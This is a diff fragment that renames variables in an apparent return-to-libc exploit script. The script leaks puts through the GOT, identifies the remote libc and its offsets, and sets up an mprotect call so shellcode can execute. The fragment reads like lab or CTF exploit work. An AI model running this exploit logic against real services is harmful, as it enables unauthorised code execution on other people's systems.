@@ -35,11 +35,11 @@ def skip_lines(proc, lines):
         proc.recvline(timeout=0.05)
 
 
-def attemptR2Libc_shellcode(putsOffset, mprotect_offset):
+def attempt_r2libc_shellcode(puts_offset, mprotect_offset):
     # Leak randomised libc puts addr
-    putsAddr = leak_via_puts(CONN, PORT, GOT_PUTS)
+    puts_addr = leak_via_puts(CONN, PORT, GOT_PUTS)
 
-    libc_base = putsAddr - putsOffset
+    libc_base = puts_addr - puts_offset
     
     code_address = libc_base
     page_aligned_address = code_address & ~0xfff
@@ -103,13 +103,13 @@ def get_libc_symbol_offsets(libc_id):
     return response.json().get('symbols', {})
 
 def main():
-    putsAddr = leak_via_puts(CONN, PORT, GOT_PUTS)
-    potential_libcs = find_potential_libcs(putsAddr)
+    puts_addr = leak_via_puts(CONN, PORT, GOT_PUTS)
+    potential_libcs = find_potential_libcs(puts_addr)
 
     for libc in potential_libcs:
         offsets = get_libc_symbol_offsets(libc)
         puts_off, mprotect_off  = (int(offsets[sym], 16) for sym in ["puts", "mprotect"])   
-        attemptR2Libc_shellcode(puts_off, mprotect_off)
+        attempt_r2libc_shellcode(puts_off, mprotect_off)
 
 
 if __name__ == "__main__":
